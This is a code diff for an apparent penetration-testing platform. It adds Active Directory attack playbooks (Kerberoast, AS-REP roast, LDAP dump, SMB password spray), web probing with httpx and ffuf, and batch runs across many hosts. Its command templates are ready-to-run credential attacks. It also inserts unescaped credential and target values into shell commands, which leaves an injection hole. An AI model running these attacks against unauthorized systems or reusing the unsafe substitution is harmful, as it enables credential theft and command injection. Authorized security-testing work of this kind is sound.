@@ -49,6 +49,28 @@ class PlaybookRunBody(BaseModel):
     severity: str = "critical,high,medium"
     keep_manual_positions: bool = True
     create_missing_networks: bool = True
+    # AD / auth fields — used for credential substitution in steps
+    username: str = ""
+    password: str = ""
+    domain: str = ""
+    hash: str = ""
+
+
+class BatchRunBody(BaseModel):
+    host_ids: list[str] = []       # explicit host selection (from UI checkboxes)
+    host_tags: list[str] = []      # filter: hosts with any of these tags
+    host_status: str = ""          # filter: hosts by status
+    parallelism: int = 3           # max concurrent runs (1-10)
+    # Playbook run params (same as PlaybookRunBody)
+    target_url: str = ""
+    flags: str = "-sV -sC -T4 --open"
+    severity: str = "critical,high,medium"
+    keep_manual_positions: bool = True
+    create_missing_networks: bool = True
+    username: str = ""
+    password: str = ""
+    domain: str = ""
+    hash: str = ""
 
 
 STEP_TEMPLATES = {
@@ -132,6 +154,122 @@ STEP_TEMPLATES = {
             {"key": "activity_type", "label": "Activity type", "type": "text", "default": "postex"},
             {"key": "host_id", "label": "Host id", "type": "text", "default": ""},
             {"key": "cred_id", "label": "Cred id", "type": "text", "default": ""},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+        ],
+    },
+    # ── AD / Kerberos templates ───────────────────────────────────────────
+    "attacker_ssh:kerberoast": {
+        "id": "attacker_ssh:kerberoast",
+        "title": "Kerberoast (impacket)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "Request Kerberos TGS tickets for SPN accounts and save for offline cracking.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile /tmp/kerberoast_{target}.txt 2>&1 && echo 'DONE'", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 120},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "kerberoast"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+            {"key": "host_id", "label": "Host id", "type": "text", "default": ""},
+            {"key": "cred_id", "label": "Cred id", "type": "text", "default": ""},
+        ],
+    },
+    "attacker_ssh:asreproast": {
+        "id": "attacker_ssh:asreproast",
+        "title": "AS-REP Roast (impacket)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "Find accounts without Kerberos pre-authentication and request AS-REP hashes.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "impacket-GetNPUsers '{domain}/' -dc-ip {target} -no-pass -usersfile /tmp/users.txt -outputfile /tmp/asrep_{target}.txt 2>&1 && echo 'DONE'", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 90},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "asreproast"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+            {"key": "host_id", "label": "Host id", "type": "text", "default": ""},
+            {"key": "cred_id", "label": "Cred id", "type": "text", "default": ""},
+        ],
+    },
+    "attacker_ssh:ldap_dump": {
+        "id": "attacker_ssh:ldap_dump",
+        "title": "LDAP Dump (ldapdomaindump)",
+        "connector_key": "attacker_ssh",
+        "operation": "exec",
+        "description": "Dump all AD objects via LDAP and save to /tmp. Requires valid domain credentials.",
+        "fields": [
+            {"key": "command", "label": "Command", "type": "textarea",
+             "default": "ldapdomaindump -u '{domain}\\{username}' -p '{password}' {target} -o /tmp/ldap_{target} 2>&1 && echo 'DONE'", "required": True},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 180},
+            {"key": "activity_type", "label": "Activity type", "type": "text", "default": "ldap_enum"},
+            {"key": "execution_mode", "label": "Execution mode", "type": "select", "options": ["auto", "project", "global"], "default": "auto"},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+            {"key": "host_id", "label": "Host id", "type": "text", "default": ""},
+            {"key": "cred_id", "label": "Cred id", "type": "text", "default": ""},
+        ],
+    },
+    "netexec:ldap_enum": {
+        "id": "netexec:ldap_enum",
+        "title": "NetExec LDAP Enum",
+        "connector_key": "netexec",
+        "operation": "scan",
+        "description": "Enumerate AD users, groups, computers and password policy via LDAP.",
+        "fields": [
+            {"key": "target", "label": "Target DC IP", "type": "text", "default": "", "runtime_fallback": True},
+            {"key": "protocol", "label": "Protocol", "type": "select", "options": ["ldap", "ldaps"], "default": "ldap"},
+            {"key": "extra_flags", "label": "Extra flags", "type": "text", "default": "--users --groups --computers --password-not-required --admin-count --trusted-for-delegation"},
+            {"key": "username", "label": "Username", "type": "text", "default": ""},
+            {"key": "password", "label": "Password", "type": "text", "default": ""},
+            {"key": "domain", "label": "Domain", "type": "text", "default": ""},
+            {"key": "hash", "label": "Hash", "type": "text", "default": ""},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 120},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+        ],
+    },
+    "netexec:spray_smb": {
+        "id": "netexec:spray_smb",
+        "title": "NetExec SMB Spray",
+        "connector_key": "netexec",
+        "operation": "scan",
+        "description": "Password spray a single username:password pair across SMB targets. Uses --continue-on-success.",
+        "fields": [
+            {"key": "target", "label": "Target", "type": "text", "default": "", "runtime_fallback": True},
+            {"key": "protocol", "label": "Protocol", "type": "select", "options": ["smb", "winrm", "rdp", "mssql", "ssh"], "default": "smb"},
+            {"key": "extra_flags", "label": "Extra flags", "type": "text", "default": "--continue-on-success --no-bruteforce"},
+            {"key": "username", "label": "Username", "type": "text", "default": ""},
+            {"key": "password", "label": "Password", "type": "text", "default": ""},
+            {"key": "domain", "label": "Domain", "type": "text", "default": ""},
+            {"key": "hash", "label": "Hash (NTLM)", "type": "text", "default": ""},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 120},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+        ],
+    },
+    "httpx:scan": {
+        "id": "httpx:scan",
+        "title": "httpx Web Probe",
+        "connector_key": "httpx",
+        "operation": "scan",
+        "description": "Probe HTTP/HTTPS services on a host or URL list. Discovers live web services, titles, and technologies.",
+        "fields": [
+            {"key": "target", "label": "Target (host, IP, CIDR or URL)", "type": "text", "default": "", "runtime_fallback": True},
+            {"key": "flags", "label": "Flags", "type": "text", "default": "-title -status-code -tech-detect -follow-redirects"},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 120},
+            {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
+        ],
+    },
+    "ffuf:scan": {
+        "id": "ffuf:scan",
+        "title": "ffuf Content Discovery",
+        "connector_key": "ffuf",
+        "operation": "scan",
+        "description": "Fuzz web directories and files. Creates findings for discovered paths.",
+        "fields": [
+            {"key": "target_url", "label": "Target URL", "type": "text", "default": "", "runtime_fallback": True},
+            {"key": "wordlist", "label": "Wordlist path", "type": "text", "default": "/usr/share/seclists/Discovery/Web-Content/common.txt"},
+            {"key": "extensions", "label": "Extensions (e.g. php,html)", "type": "text", "default": ""},
+            {"key": "flags", "label": "Flags", "type": "text", "default": "-mc 200,204,301,302,307,401,403,405"},
+            {"key": "timeout_seconds", "label": "Timeout", "type": "number", "default": 300},
             {"key": "target_id", "label": "Attacker target id", "type": "text", "default": ""},
         ],
     },
@@ -357,6 +495,104 @@ BUILTIN_PLAYBOOKS = {
             {"title": "Nuclei scan", "connector_key": "nuclei", "operation": "scan", "params": {}, "on_success": "next", "on_failure": "stop", "result_conditions": [{"when": "success", "result_key": "findings_created", "operator": "gt", "value": 0, "action": "stop"}]},
         ],
     },
+    # ── AD Playbooks ──────────────────────────────────────────────────────
+    "ad-ldap-enum": {
+        "id": "ad-ldap-enum",
+        "title": "AD — LDAP Enumeration",
+        "description": "Enumerate AD users, groups, computers and password policy via NetExec LDAP. Requires domain credentials in the run form.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "NetExec LDAP — users/groups/computers",
+                "connector_key": "netexec", "operation": "scan",
+                "params": {"protocol": "ldap", "extra_flags": "--users --groups --computers --password-not-required --admin-count --trusted-for-delegation"},
+                "on_success": "next", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-spray-smb": {
+        "id": "ad-spray-smb",
+        "title": "AD — SMB Password Spray",
+        "description": "Spray a single username:password pair across SMB hosts. Set credentials in the run form. Uses --continue-on-success so the scan keeps going after first hit.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "NetExec SMB spray",
+                "connector_key": "netexec", "operation": "scan",
+                "params": {"protocol": "smb", "extra_flags": "--continue-on-success --no-bruteforce"},
+                "on_success": "next", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-kerberoast": {
+        "id": "ad-kerberoast",
+        "title": "AD — Kerberoast",
+        "description": "Request TGS tickets for all SPN accounts via impacket-GetUserSPNs. Tickets saved to /tmp on the attacker box for offline cracking. Set domain/username/password in the run form.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "Kerberoast — GetUserSPNs",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile /tmp/kerberoast_{target}.txt 2>&1 && echo 'DONE'",
+                    "timeout_seconds": 120, "activity_type": "kerberoast", "execution_mode": "auto",
+                },
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-asreproast": {
+        "id": "ad-asreproast",
+        "title": "AD — AS-REP Roast",
+        "description": "Find accounts without Kerberos pre-auth and capture AS-REP hashes. Requires a users list at /tmp/users.txt on the attacker box. Set domain in the run form.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "AS-REP Roast — GetNPUsers",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-GetNPUsers '{domain}/' -dc-ip {target} -no-pass -usersfile /tmp/users.txt -outputfile /tmp/asrep_{target}.txt 2>&1 && echo 'DONE'",
+                    "timeout_seconds": 90, "activity_type": "asreproast", "execution_mode": "auto",
+                },
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
+    "ad-full-recon": {
+        "id": "ad-full-recon",
+        "title": "AD — Full DC Recon",
+        "description": "Full Domain Controller reconnaissance: port scan → LDAP enum (users/groups/computers/policy) → Kerberoast → topology refresh. Set target (DC IP) and credentials in the run form.",
+        "editable": False,
+        "steps": [
+            {
+                "title": "Nmap — DC port scan",
+                "connector_key": "nmap", "operation": "scan",
+                "params": {"flags": "-p 88,135,139,389,445,464,636,3268,3269 -sV --open"},
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "NetExec LDAP — users/groups/computers",
+                "connector_key": "netexec", "operation": "scan",
+                "params": {"protocol": "ldap", "extra_flags": "--users --groups --computers --password-not-required --admin-count"},
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "Kerberoast — GetUserSPNs",
+                "connector_key": "attacker_ssh", "operation": "exec",
+                "params": {
+                    "command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile /tmp/kerberoast_{target}.txt 2>&1 && echo 'DONE'",
+                    "timeout_seconds": 120, "activity_type": "kerberoast", "execution_mode": "auto",
+                },
+                "on_success": "next", "on_failure": "next",
+            },
+            {
+                "title": "Topology auto-build",
+                "connector_key": "topology", "operation": "auto_build",
+                "params": {},
+                "on_success": "stop", "on_failure": "stop",
+            },
+        ],
+    },
 }
 
 
@@ -398,6 +634,20 @@ def _update_run(db: Session, run: models.PlaybookRun, **updates) -> models.Playb
     db.commit()
     db.refresh(run)
     bcast(run.pid, "playbook_run", "update", _playbook_run_dict(run))
+    # Notify on terminal status
+    new_status = updates.get("status")
+    if new_status in ("done", "failed", "cancelled"):
+        from ..core.notifications import dispatch_sync
+        batch_id = (run.request_json or {}).get("batch_id")
+        event = "playbook_done" if not batch_id else "batch_done"
+        icon = "✅" if new_status == "done" else ("❌" if new_status == "failed" else "⏹")
+        title = f"{icon} {'Batch' if batch_id else 'Playbook'} run {new_status}: {run.title}"
+        result = run.result_json or {}
+        parts = [f"Target: {run.target}" if run.target else None,
+                 f"Steps: {result.get('job_count', len(run.jobs_json or []))}" ,
+                 f"Batch: {batch_id}" if batch_id else None]
+        body = "\n".join(p for p in parts if p)
+        dispatch_sync(db, event, title, body, {"run_id": run.id, "pid": run.pid})
     return run
 
 
@@ -434,6 +684,20 @@ def _resolve_playbook(db: Session, playbook_id: str) -> dict | None:
     if custom:
         return _serialize_custom(custom)
     return None
+
+
+def _substitute_run_vars(command: str, body: PlaybookRunBody) -> str:
+    """Replace {target}/{domain}/{username}/{password}/{hash} placeholders in commands."""
+    subs = {
+        "{target}": body.target or "",
+        "{domain}": body.domain or "",
+        "{username}": body.username or "",
+        "{password}": body.password or "",
+        "{hash}": body.hash or "",
+    }
+    for k, v in subs.items():
+        command = command.replace(k, v)
+    return command
 
 
 def _job_spec_for_step(pid: str, step: dict, body: PlaybookRunBody, created_by: str) -> dict:
@@ -508,6 +772,11 @@ def _job_spec_for_step(pid: str, step: dict, body: PlaybookRunBody, created_by: 
         protocol = params.get("protocol") or "smb"
         extra_flags = params.get("extra_flags") or "--users --groups"
         timeout_seconds = int(params.get("timeout_seconds") or 120)
+        # Step params take priority; fall back to run-form auth fields
+        username = params.get("username") or body.username or ""
+        password = params.get("password") or body.password or ""
+        domain = params.get("domain") or body.domain or ""
+        hash_ = params.get("hash") or body.hash or ""
         return {
             "job_type": "cme",
             "title": f"{title}: {target}",
@@ -523,22 +792,23 @@ def _job_spec_for_step(pid: str, step: dict, body: PlaybookRunBody, created_by: 
                 "extra_flags": extra_flags,
                 "target_id": params.get("target_id") or body.target_id,
                 "timeout_seconds": timeout_seconds,
-                "username": params.get("username") or "",
-                "password": params.get("password") or "",
-                "domain": params.get("domain") or "",
-                "hash": params.get("hash") or "",
+                "username": username,
+                "password": password,
+                "domain": domain,
+                "hash": hash_,
             },
             "created_by": created_by,
         }
 
     if connector_key == "attacker_ssh" and operation == "exec":
-        command = (params.get("command") or "").strip()
-        if not command:
+        raw_command = (params.get("command") or "").strip()
+        if not raw_command:
             raise HTTPException(400, "This playbook step requires command")
+        command = _substitute_run_vars(raw_command, body)
         return {
             "job_type": "exec",
             "title": title,
-            "target": params.get("target") or "",
+            "target": params.get("target") or body.target or "",
             "command": command,
             "connector_key": "attacker_ssh",
             "operation": "exec",
@@ -554,6 +824,49 @@ def _job_spec_for_step(pid: str, step: dict, body: PlaybookRunBody, created_by: 
                 "timeout_seconds": int(params.get("timeout_seconds") or 45),
                 "activity_type": params.get("activity_type") or "postex",
             },
+            "created_by": created_by,
+        }
+
+    if connector_key == "httpx" and operation == "scan":
+        target = (params.get("target") or body.target or "").strip()
+        if not target:
+            raise HTTPException(400, "This playbook step requires target")
+        flags = params.get("flags") or "-title -status-code -tech-detect -follow-redirects"
+        timeout_seconds = int(params.get("timeout_seconds") or 120)
+        return {
+            "job_type": "httpx",
+            "title": f"{title}: {target}",
+            "target": target,
+            "command": f"httpx -u '{target}' {flags} -json -silent 2>/dev/null",
+            "connector_key": "httpx",
+            "operation": "scan",
+            "related_entity_type": "project",
+            "related_entity_id": pid,
+            "request_json": {"target": target, "flags": flags, "target_id": params.get("target_id") or body.target_id, "timeout_seconds": timeout_seconds},
+            "created_by": created_by,
+        }
+
+    if connector_key == "ffuf" and operation == "scan":
+        target_url = (params.get("target_url") or body.target_url or "").strip()
+        if not target_url:
+            raise HTTPException(400, "This playbook step requires target_url")
+        wordlist = params.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/common.txt"
+        extensions = params.get("extensions") or ""
+        flags = params.get("flags") or "-mc 200,204,301,302,307,401,403,405"
+        timeout_seconds = int(params.get("timeout_seconds") or 300)
+        ext_flag = f"-e {extensions}" if extensions.strip() else ""
+        url = f"{target_url}/FUZZ"
+        cmd = f"ffuf -u '{url}' -w '{wordlist}' {ext_flag} {flags} -o /tmp/ffuf_out.json -of json -s 2>/dev/null && cat /tmp/ffuf_out.json"
+        return {
+            "job_type": "ffuf",
+            "title": f"{title}: {target_url}",
+            "target": target_url,
+            "command": cmd,
+            "connector_key": "ffuf",
+            "operation": "scan",
+            "related_entity_type": "project",
+            "related_entity_id": pid,
+            "request_json": {"target_url": target_url, "wordlist": wordlist, "extensions": extensions, "flags": flags, "target_id": params.get("target_id") or body.target_id, "timeout_seconds": timeout_seconds},
             "created_by": created_by,
         }
 
@@ -861,6 +1174,101 @@ async def run_playbook(
     }
 
 
+def _resolve_batch_hosts(db: Session, pid: str, body: BatchRunBody) -> list:
+    q = db.query(models.Host).filter(models.Host.pid == pid, models.Host.is_attacker == False)
+    if body.host_ids:
+        q = q.filter(models.Host.id.in_(body.host_ids))
+    else:
+        if body.host_tags:
+            # PostgreSQL ARRAY overlap: host must have at least one matching tag
+            q = q.filter(models.Host.tags.overlap(body.host_tags))
+        if body.host_status:
+            q = q.filter(models.Host.status == body.host_status)
+    return q.all()
+
+
+@router.post("/api/projects/{pid}/playbooks/{playbook_id}/batch-run", status_code=201)
+async def batch_run_playbook(
+    pid: str,
+    playbook_id: str,
+    body: BatchRunBody,
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    """Fan-out: run one playbook against a filtered set of hosts. Each host gets its own PlaybookRun.
+
+    The host's IP is injected as `target` for every run, so any step that uses
+    `body.target` (nmap, netexec, attacker_ssh command {target} placeholder) will
+    automatically get the right target per host.
+    """
+    check_pid_access(db, pid, user, "command_outputs.create")
+    playbook = _resolve_playbook(db, playbook_id)
+    if not playbook:
+        raise HTTPException(404, "Playbook not found")
+
+    hosts = _resolve_batch_hosts(db, pid, body)
+    if not hosts:
+        raise HTTPException(400, "No matching hosts found for the given filter")
+
+    batch_id = f"batch_{uuid4().hex[:10]}"
+    created_by = getattr(user, "username", "") or ""
+    parallelism = max(1, min(body.parallelism, 10))
+
+    runs_and_jobs: list[tuple[models.PlaybookRun, list[models.Job]]] = []
+    for host in hosts:
+        run_body = PlaybookRunBody(
+            target=host.ip or "",
+            target_url=body.target_url,
+            flags=body.flags,
+            severity=body.severity,
+            keep_manual_positions=body.keep_manual_positions,
+            create_missing_networks=body.create_missing_networks,
+            username=body.username,
+            password=body.password,
+            domain=body.domain,
+            hash=body.hash,
+        )
+        new_run_id = f"pbr_{uuid4().hex[:10]}"
+        jobs = _queue_playbook_jobs(db, pid, playbook, run_body, created_by, new_run_id)
+        run = models.PlaybookRun(
+            id=new_run_id,
+            pid=pid,
+            playbook_id=playbook["id"],
+            title=f"{playbook['title']} — {host.ip}",
+            status="queued",
+            created_by=created_by,
+            created_at=_now(),
+            started_at="",
+            finished_at="",
+            target=host.ip or "",
+            error_output="",
+            jobs_json=[{"id": job.id, "title": job.title, "status": job.status} for job in jobs],
+            request_json={**run_body.model_dump(), "batch_id": batch_id, "host_id": host.id},
+            result_json={},
+        )
+        db.add(run)
+        db.commit()
+        db.refresh(run)
+        bcast(pid, "playbook_run", "create", _playbook_run_dict(run))
+        runs_and_jobs.append((run, jobs))
+
+    sem = asyncio.Semaphore(parallelism)
+
+    async def _run_with_sem(run: models.PlaybookRun, job_ids: list[str], steps: list[dict]) -> None:
+        async with sem:
+            await _run_sequence(run.id, job_ids, steps)
+
+    for run, jobs in runs_and_jobs:
+        asyncio.create_task(_run_with_sem(run, [j.id for j in jobs], playbook.get("steps", [])))
+
+    return {
+        "ok": True,
+        "batch_id": batch_id,
+        "total": len(runs_and_jobs),
+        "runs": [_playbook_run_dict(r) for r, _ in runs_and_jobs],
+    }
+
+
 @router.post("/api/projects/{pid}/playbook-runs/{run_id}/cancel")
 def cancel_playbook_run(
     pid: str,
@@ -927,3 +1335,47 @@ async def rerun_playbook_run(
     bcast(pid, "playbook_run", "create", _playbook_run_dict(rerun))
     asyncio.create_task(_run_sequence(rerun.id, [job.id for job in jobs], playbook.get("steps", [])))
     return {"ok": True, "playbook_run": _playbook_run_dict(rerun)}
+
+
+async def _launch_playbook_run(pid: str, playbook_id: str, body_dict: dict, created_by: str = "scheduler") -> str | None:
+    """
+    Launch a playbook run without an HTTP request context.
+    Used by the cron scheduler. Returns the run ID or None on failure.
+    """
+    from ..database import SessionLocal
+    db = SessionLocal()
+    try:
+        playbook = _resolve_playbook(db, playbook_id)
+        if not playbook:
+            return None
+        body = PlaybookRunBody(**{k: v for k, v in body_dict.items() if k in PlaybookRunBody.model_fields})
+        provisional_run_id = f"pbr_{uuid4().hex[:10]}"
+        jobs = _queue_playbook_jobs(db, pid, playbook, body, created_by, provisional_run_id)
+        run = models.PlaybookRun(
+            id=provisional_run_id,
+            pid=pid,
+            playbook_id=playbook["id"],
+            title=playbook["title"],
+            status="queued",
+            created_by=created_by,
+            created_at=_now(),
+            started_at="",
+            finished_at="",
+            target=body.target.strip() or body.target_url.strip(),
+            error_output="",
+            jobs_json=[{"id": job.id, "title": job.title, "status": job.status} for job in jobs],
+            request_json=body_dict,
+            result_json={},
+        )
+        db.add(run)
+        db.commit()
+        db.refresh(run)
+        bcast(pid, "playbook_run", "create", _playbook_run_dict(run))
+        asyncio.create_task(_run_sequence(run.id, [job.id for job in jobs], playbook.get("steps", [])))
+        return run.id
+    except Exception as e:
+        import logging
+        logging.getLogger(__name__).warning("[scheduler] _launch_playbook_run failed: %s", e)
+        return None
+    finally:
+        db.close()
